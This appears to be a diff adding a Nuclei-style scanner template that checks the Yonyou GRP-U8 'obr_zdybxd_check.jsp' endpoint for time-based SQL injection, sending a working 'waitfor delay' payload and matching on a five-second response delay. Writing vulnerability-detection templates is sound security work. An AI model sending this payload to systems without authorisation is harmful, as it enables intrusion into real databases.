@@ -1,0 +1,28 @@
+id: YongYouGRPU8_obr_zdybxd_check_sqlInjection
+
+info:
+  name: YongYouGRPU8_obr_zdybxd_check_sqlInjection
+  author: iSee857
+  severity: high
+  description: YongYouGRPU8_obr_zdybxd_check_sqlInjection
+  reference: |
+    -
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /u8qx/obr_zdybxd_check.jsp?mlid=1';waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
